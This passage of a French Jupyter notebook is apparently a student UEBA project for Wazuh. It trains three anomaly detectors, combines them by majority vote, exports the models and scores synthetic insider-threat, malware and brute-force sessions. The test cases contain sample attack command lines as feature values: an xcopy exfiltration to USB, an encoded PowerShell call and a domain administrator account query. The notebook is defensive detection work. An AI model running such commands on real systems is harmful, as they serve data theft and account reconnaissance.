# ── Distribution des erreurs de reconstruction ────────────────────
axes[1].hist(reconstruction_errors, bins=50, color=COLORS['normal'], edgecolor='white', alpha=0.8)
axes[1].axvline(ae_threshold, color='red', linestyle='--', linewidth=2,
                label=f'Seuil : {ae_threshold:.4f}')

# axvspan évite les problèmes de get_ylim() avant le rendu
x_right = max(reconstruction_errors.max(), ae_threshold) * 1.05
axes[1].axvspan(ae_threshold, x_right, alpha=0.2, color='red', label='Zone anomalie')

axes[1].set_title('Erreurs de reconstruction — Dataset Normal', fontweight='bold')
axes[1].set_xlabel('MSE (Reconstruction Error)')
axes[1].set_ylabel('Fréquence')
axes[1].legend()

plt.tight_layout()
plt.savefig('viz_autoencoder.png', dpi=150, bbox_inches='tight')
plt.show()
print('✓ viz_autoencoder.png')


## 10. Système de Vote d'Ensemble

In [ ]:
# ─── Vote majoritaire des 3 modèles ──────────────────────────────────────

def ensemble_predict(X: np.ndarray, threshold_votes: int = 2) -> dict:
    """
    Applique les 3 modèles et retourne le vote d'ensemble.

    Args:
        X               : Données normalisées (n_samples, n_features)
        threshold_votes : Nombre minimum de votes pour déclencher une alerte

    Returns:
        dict avec prédictions individuelles, votes, et verdict final
    """
    # Isolation Forest : -1 = anomalie, 1 = normal
    if_pred  = iso_forest.predict(X)
    if_score = iso_forest.decision_function(X)

    # One-Class SVM : -1 = anomalie, 1 = normal
    ocsvm_pred  = ocsvm.predict(X)
    ocsvm_score = ocsvm.decision_function(X)

    # Autoencoder : erreur > seuil = anomalie
    ae_recon  = autoencoder.predict(X, verbose=0)
    ae_errors = np.mean(np.power(X - ae_recon, 2), axis=1)
    ae_pred   = np.where(ae_errors > ae_threshold, -1, 1)

    # Votes (-1 → anomalie = True)
    votes = (
        (if_pred == -1).astype(int) +
        (ocsvm_pred == -1).astype(int) +
        (ae_pred == -1).astype(int)
    )

    # Décision finale
    final_pred = (votes >= threshold_votes).astype(int)  # 1 = anomalie

    return {
        'if_pred':     if_pred,
        'if_score':    if_score,
        'ocsvm_pred':  ocsvm_pred,
        'ocsvm_score': ocsvm_score,
        'ae_pred':     ae_pred,
        'ae_errors':   ae_errors,
        'votes':       votes,
        'final_pred':  final_pred,
        'confidence':  votes / 3.0,
    }


# Test sur les données normales
ensemble_normal = ensemble_predict(X_scaled)
ensemble_anomaly_rate = ensemble_normal['final_pred'].mean()

print('=== Résultats Vote d\'Ensemble sur données NORMALES ===')
print(f'Taux d\'anomalie — Isolation Forest : {(ensemble_normal["if_pred"] == -1).mean():.1%}')
print(f'Taux d\'anomalie — One-Class SVM   : {(ensemble_normal["ocsvm_pred"] == -1).mean():.1%}')
print(f'Taux d\'anomalie — Autoencoder     : {(ensemble_normal["ae_pred"] == -1).mean():.1%}')
print(f'Taux d\'anomalie — ENSEMBLE (≥2/3) : {ensemble_anomaly_rate:.1%}')
print()
print('Distribution des votes :')
for v in [0, 1, 2, 3]:
    count = (ensemble_normal['votes'] == v).sum()
    print(f'  {v} vote(s) : {count} sessions ({count/len(X_scaled):.1%})')

## 11. Évaluation sur scénarios d'attaque simulés

> **⚠️ Honnêteté de l'évaluation (audit RC-2).** Les attaques ci-dessous sont
> **synthétiques** et tirées de plages volontairement disjointes du normal : tout
> seuil les sépare ~parfaitement. Ces chiffres sont une **borne haute / test de
> bon fonctionnement**, PAS une mesure de performance réelle. Pour une évaluation
> défendable au jury : (1) entraîner sur le vrai normal Wazuh, (2) mesurer le taux
> de **faux positifs sur un normal tenu à l'écart**, (3) tester sur de **vraies**
> attaques rejouées. La baseline figée (`baseline.json`) garantit que les z-scores
> du test sont calculés comme à l'entraînement.

In [ ]:
# ─── Génération des données d'attaque ────────────────────────────────────
print('Génération des scénarios d\'attaque...')

base = datetime(2024, 1, 20)  # Semaine suivante
n_attacks = 80

insider_sessions = [simulate_insider_threat_session(base_date=base) for _ in range(n_attacks // 2)]
malware_sessions = [simulate_malware_session(base_date=base) for _ in range(n_attacks // 2)]

df_attack = pd.DataFrame(insider_sessions + malware_sessions)

# Mélange avec des sessions normales supplémentaires
df_test_normal = pd.DataFrame([
    simulate_normal_session(base_date=base) for _ in range(120)
])

df_test = pd.concat([df_test_normal, df_attack], ignore_index=True)
df_test = df_test.sample(frac=1, random_state=SEED).reset_index(drop=True)

# Ajout z-scores (calculés sur le dataset de test)
# Z-scores du test depuis la baseline FIGÉE (cohérent avec l'entraînement, audit RC-1)
df_test = apply_baseline_zscores(df_test, baseline)

print(f'Dataset de test : {len(df_test)} sessions')
print(f'  Normal          : {(df_test["label"] == 0).sum()}')
print(f'  Insider Threat  : {(df_test["label"] == 1).sum()}')
print(f'  Malware         : {(df_test["label"] == 2).sum()}')

In [ ]:
# ─── Évaluation des modèles ───────────────────────────────────────────────

X_test = df_test[NUMERIC_FEATURES].fillna(0).values.astype(np.float32)
X_test_scaled = scaler.transform(X_test)

# Vrai label binaire (0 = normal, 1 = attaque)
y_true_binary = (df_test['label'] > 0).astype(int).values

# Prédictions ensemble
ensemble_test = ensemble_predict(X_test_scaled)
y_pred_binary = ensemble_test['final_pred']

# Métriques
print('=== Rapport de Classification — Vote d\'Ensemble ===')
print(classification_report(
    y_true_binary, y_pred_binary,
    target_names=['Normal', 'Attaque'],
    zero_division=0
))

# Matrice de confusion
cm = confusion_matrix(y_true_binary, y_pred_binary)
tn, fp, fn, tp = cm.ravel()

print(f'Vrais Positifs  (TP) : {tp}  — attaques correctement détectées')
print(f'Faux Positifs   (FP) : {fp}  — fausses alertes')
print(f'Faux Négatifs   (FN) : {fn}  — attaques manquées')
print(f'Vrais Négatifs  (TN) : {tn}  — normaux correctement classifiés')
print()
print(f'Taux de détection (Recall) : {tp/(tp+fn):.1%}')
print(f'Précision                  : {tp/(tp+fp):.1%}')
print(f'Taux de faux positifs      : {fp/(fp+tn):.1%}')

In [ ]:
# ─── Visualisations d'évaluation ─────────────────────────────────────────
fig, axes = plt.subplots(2, 2, figsize=(16, 14))

# 1. Matrice de confusion
sns.heatmap(
    cm, annot=True, fmt='d', cmap='Blues', ax=axes[0, 0],
    xticklabels=['Normal', 'Attaque'],
    yticklabels=['Normal', 'Attaque'],
    linewidths=0.5,
)
axes[0, 0].set_title('Matrice de Confusion — Vote d\'Ensemble', fontweight='bold')
axes[0, 0].set_ylabel('Vraie étiquette')
axes[0, 0].set_xlabel('Étiquette prédite')

# 2. Distribution des votes par catégorie
df_test['votes'] = ensemble_test['votes']
df_test['label_str'] = df_test['label'].map({0: 'Normal', 1: 'Insider Threat', 2: 'Malware'})

vote_data = df_test.groupby(['label_str', 'votes']).size().reset_index(name='count')
colors_cat = {'Normal': COLORS['normal'], 'Insider Threat': '#e67e22', 'Malware': COLORS['anomaly']}

for cat, grp in df_test.groupby('label_str'):
    axes[0, 1].hist(
        grp['votes'], bins=[0, 1, 2, 3, 4], alpha=0.7,
        label=cat, color=colors_cat.get(cat, 'gray'), edgecolor='white', align='left'
    )
axes[0, 1].axvline(1.5, color='black', linestyle='--', linewidth=2, label='Seuil (≥2)')
axes[0, 1].set_title('Distribution des votes par catégorie', fontweight='bold')
axes[0, 1].set_xlabel('Nombre de votes anomalie')
axes[0, 1].set_ylabel('Fréquence')
axes[0, 1].set_xticks([0, 1, 2, 3])
axes[0, 1].legend()

# 3. Scatter: nb_files_accessed vs bytes_sent coloré par label
for cat, grp in df_test.groupby('label_str'):
    axes[1, 0].scatter(
        grp['nb_files_accessed'], grp['bytes_sent'],
        label=cat, alpha=0.6, s=30, color=colors_cat.get(cat, 'gray')
    )
axes[1, 0].set_title('Séparation des classes — Fichiers vs Réseau', fontweight='bold')
axes[1, 0].set_xlabel('nb_files_accessed')
axes[1, 0].set_ylabel('bytes_sent')
axes[1, 0].legend()
axes[1, 0].set_yscale('log')

# 4. Radar des features moyennes par type
features_radar = ['nb_files_accessed', 'nb_failed_logins', 'nb_processes',
                  'is_night', 'nb_sensitive_files', 'velocity']

N = len(features_radar)
angles = np.linspace(0, 2 * np.pi, N, endpoint=False).tolist()
angles += angles[:1]

for cat, grp in df_test.groupby('label_str'):
    values = [grp[f].mean() for f in features_radar]
    max_vals = [df_test[f].max() + 1e-9 for f in features_radar]
    values_norm = [v / m for v, m in zip(values, max_vals)]
    values_norm += values_norm[:1]
    axes[1, 1].plot(angles, values_norm, 'o-', linewidth=2,
                    label=cat, color=colors_cat.get(cat, 'gray'))
    axes[1, 1].fill(angles, values_norm, alpha=0.1, color=colors_cat.get(cat, 'gray'))

axes[1, 1].set_xticks(angles[:-1])
axes[1, 1].set_xticklabels(features_radar, size=9)
axes[1, 1].set_title('Radar — Profil moyen par catégorie', fontweight='bold')
axes[1, 1].legend(loc='upper right', bbox_to_anchor=(1.3, 1.0))
axes[1, 1].set_ylim(0, 1)

plt.suptitle('Évaluation du Système UEBA — Ensemble Vote', fontsize=15, fontweight='bold', y=1.01)
plt.tight_layout()
plt.savefig('viz_evaluation.png', dpi=150, bbox_inches='tight')
plt.show()
print('Visualisation enregistrée : viz_evaluation.png')

## 12. Export des modèles (.pkl)

In [ ]:
# ─── Vérification et inventaire des modèles exportés ─────────────────────
import os

print('=== Inventaire des modèles exportés ===')
print(f'Répertoire : {MODELS_DIR}/')
print()

expected_files = [
    ('scaler.pkl',            'StandardScaler — Normalisation'),
    ('isolation_forest.pkl',  'Isolation Forest — Anomalies comportementales'),
    ('one_class_svm.pkl',     'One-Class SVM — Compromission de compte'),
    ('autoencoder.keras',     'Autoencoder — Modèle Keras natif'),
    ('ae_threshold.json',     'Seuil reconstruction autoencoder'),
    ('baseline.json',         'Baseline figée par utilisateur'),
]

all_ok = True
for filename, description in expected_files:
    path = f'{MODELS_DIR}/{filename}'
    exists = os.path.exists(path)
    size   = os.path.getsize(path) if exists else 0
    status = '✓' if exists else '✗ MANQUANT'
    print(f'  {status}  {filename:<30} ({size/1024:.1f} KB)  — {description}')
    if not exists:
        all_ok = False

print()
if all_ok:
    print('✓ Tous les fichiers sont présents — prêt pour wazuh_integration.py')
else:
    print('✗ Des fichiers sont manquants — relancer les cellules d\'entraînement')

In [ ]:
# ─── Test de rechargement des modèles ────────────────────────────────────
print('Test de rechargement des modèles depuis les fichiers...')

scaler_loaded     = joblib.load(f'{MODELS_DIR}/scaler.pkl')
iso_forest_loaded = joblib.load(f'{MODELS_DIR}/isolation_forest.pkl')
ocsvm_loaded      = joblib.load(f'{MODELS_DIR}/one_class_svm.pkl')

# Autoencoder : rechargé au format natif Keras (.keras) + seuil JSON
ae_loaded = keras.models.load_model(f'{MODELS_DIR}/autoencoder.keras')
with open(f'{MODELS_DIR}/ae_threshold.json') as f:
    ae_threshold_loaded = json.load(f)['threshold']

# Test sur 5 samples
X_sample = X_scaled[:5]

if_test    = iso_forest_loaded.predict(X_sample)
ocsvm_test = ocsvm_loaded.predict(X_sample)
ae_recon   = ae_loaded.predict(X_sample, verbose=0)
ae_mse     = np.mean(np.power(X_sample - ae_recon, 2), axis=1)
ae_test    = np.where(ae_mse > ae_threshold_loaded, -1, 1)  # convention sklearn

print('\nPrédictions sur 5 échantillons normaux :')
print(f'  Isolation Forest : {if_test}   (1=normal, -1=anomalie)')
print(f'  One-Class SVM    : {ocsvm_test}')
print(f'  Autoencoder      : {ae_test}')
print()
print('✓ Rechargement réussi — modèles opérationnels')


## 13. Tests avec scénarios d'attaque détaillés

In [ ]:
# ─── Scénarios d'attaque spécifiques ─────────────────────────────────────

def predict_session(session_features: dict, label: str = '') -> None:
    """Applique l'ensemble et affiche le résultat pour une session."""
    # Vecteur de features
    vec = [float(session_features.get(f, 0)) for f in NUMERIC_FEATURES]
    x   = np.array([vec], dtype=np.float32)
    x_s = scaler.transform(x)

    # Prédictions
    if_pred   = iso_forest.predict(x_s)[0]
    if_score  = iso_forest.decision_function(x_s)[0]
    ocsvm_p   = ocsvm.predict(x_s)[0]
    ocsvm_s   = ocsvm.decision_function(x_s)[0]
    ae_recon  = autoencoder.predict(x_s, verbose=0)
    ae_err    = float(np.mean(np.power(x_s - ae_recon, 2)))
    ae_p      = -1 if ae_err > ae_threshold else 1

    votes = sum([
        1 if if_pred  == -1 else 0,
        1 if ocsvm_p  == -1 else 0,
        1 if ae_p     == -1 else 0,
    ])

    is_anomaly = votes >= 2
    icon = '🚨' if is_anomaly else '✅'

    print(f'\n{"="*55}')
    print(f' Scénario : {label}')
    print(f'{"="*55}')
    print(f'  Heure         : {session_features.get("hour", "N/A")}h')
    print(f'  is_night      : {session_features.get("is_night", 0)}')
    print(f'  is_weekend    : {session_features.get("is_weekend", 0)}')
    print(f'  Fichiers      : {session_features.get("nb_files_accessed", 0)}')
    print(f'  Sensibles     : {session_features.get("nb_sensitive_files", 0)}')
    print(f'  Logins échoués: {session_features.get("nb_failed_logins", 0)}')
    print(f'  Processus     : {session_features.get("nb_processes", 0)}')
    print(f'  Bytes envoyés : {session_features.get("bytes_sent", 0):,}')
    print(f'  Processus     : {session_features.get("process_name", "")}')
    print(f'\n  Isolation Forest  : {"ANOMALIE" if if_pred == -1 else "normal"} (score={if_score:.4f})')
    print(f'  One-Class SVM     : {"ANOMALIE" if ocsvm_p == -1 else "normal"} (score={ocsvm_s:.4f})')
    print(f'  Autoencoder       : {"ANOMALIE" if ae_p == -1 else "normal"} (MSE={ae_err:.6f})')
    print(f'\n  {icon} Vote final      : {votes}/3 → {"ALERTE UEBA" if is_anomaly else "Comportement normal"}')
    print(f'  Confiance        : {votes/3:.0%}')


# ─── Test 1 : Session normale
normal_test = {
    'hour': 10, 'is_night': 0, 'is_weekend': 0,
    'nb_files_accessed': 15, 'nb_sensitive_files': 0,
    'nb_failed_logins': 0, 'nb_processes': 8,
    'bytes_sent': 12000, 'new_ip': 0,
    'sensitive_path_access': 0,
    'process_name': 'chrome.exe', 'command_line': '',
    'velocity': 0.25, 'entropy_commands': 0.8,
    'z_score_files': 0.2, 'z_score_logins': 0.1,
}
predict_session(normal_test, 'Utilisateur normal (9h-18h, lundi)')

In [ ]:
# ─── Test 2 : Insider Threat — Exfiltration nocturne
insider_test = {
    'hour': 2, 'is_night': 1, 'is_weekend': 1,
    'nb_files_accessed': 250, 'nb_sensitive_files': 85,
    'nb_failed_logins': 2, 'nb_processes': 18,
    'bytes_sent': 3_500_000, 'new_ip': 1,
    'sensitive_path_access': 1,
    'process_name': 'xcopy.exe',
    'command_line': 'xcopy C:\\Sensitive\\ D:\\usb\\ /E /H /C',
    'velocity': 12.5, 'entropy_commands': 2.8,
    'z_score_files': 4.2, 'z_score_logins': 0.5,
}
predict_session(insider_test, 'Insider Threat — Exfiltration nocturne (2h, samedi)')

In [ ]:
# ─── Test 3 : Malware — PowerShell obfusqué
malware_test = {
    'hour': 14, 'is_night': 0, 'is_weekend': 0,
    'nb_files_accessed': 45, 'nb_sensitive_files': 3,
    'nb_failed_logins': 0, 'nb_processes': 78,
    'bytes_sent': 850_000, 'new_ip': 1,
    'sensitive_path_access': 0,
    'process_name': 'powershell.exe',
    'command_line': 'powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=',
    'velocity': 8.2, 'entropy_commands': 4.1,
    'z_score_files': 1.8, 'z_score_logins': 0.0,
}
predict_session(malware_test, 'Malware — PowerShell obfusqué (14h, mardi)')

In [ ]:
# ─── Test 4 : Brute Force + Compromission de compte
bruteforce_test = {
    'hour': 3, 'is_night': 1, 'is_weekend': 0,
    'nb_files_accessed': 2, 'nb_sensitive_files': 1,
    'nb_failed_logins': 47, 'nb_processes': 4,
    'bytes_sent': 5000, 'new_ip': 1,
    'sensitive_path_access': 1,
    'process_name': 'cmd.exe',
    'command_line': 'net user administrator /domain',
    'velocity': 0.05, 'entropy_commands': 1.2,
    'z_score_files': -0.8, 'z_score_logins': 8.5,
}
predict_session(bruteforce_test, 'Brute Force — Compromission de compte (3h du matin)')

In [ ]:
print('\n' + '='*60)
print('  RAPPORT FINAL — Système UEBA PFE')
print('  Cires Technologies / Tanger Med Group')
print('='*60)
print()
print('Modèles entraînés sur comportement normal uniquement :')
print(f'  Isolation Forest  : {len(X_scaled)} sessions')
print(f'  One-Class SVM     : {min(2000, len(X_scaled))} sessions (sous-échantillon)')
print(f'  Autoencoder       : {len(X_train_ae)} train / {len(X_val_ae)} validation')
print()
print('Évaluation sur scénarios d\'attaque simulés :')
print(f'  Dataset de test   : {len(df_test)} sessions')
print(f'  Taux de détection : {tp/(tp+fn):.1%}')
print(f'  Précision         : {tp/(tp+fp):.1%}')
print(f'  Faux positifs     : {fp/(fp+tn):.1%}')
print()

models_path = Path(MODELS_DIR)
if models_path.exists():
    print('Fichiers exportés :')
    for f in sorted(models_path.iterdir()):
        print(f'  {f.name:<35} ({f.stat().st_size/1024:.1f} KB)')
print()
print('✓ Pipeline ML UEBA complet — prêt pour intégration Wazuh')
print('  Daemon : python -m ueba.integration.daemon --config config/config.yaml')
